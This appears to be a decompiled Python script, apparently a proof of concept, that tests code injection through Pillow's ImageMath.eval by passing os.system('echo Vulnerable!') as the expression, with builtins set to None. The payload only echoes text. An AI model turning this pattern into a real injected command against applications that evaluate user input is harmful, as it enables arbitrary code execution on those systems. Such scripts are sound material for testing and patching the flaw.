# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 1130_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 343 bytes
from PIL import ImageMath
env = {"__builtins__": None}
result = ImageMath.eval("os.system('echo Vulnerable!')", env=env)
print(result)

# okay decompiling 1130_1.pyc
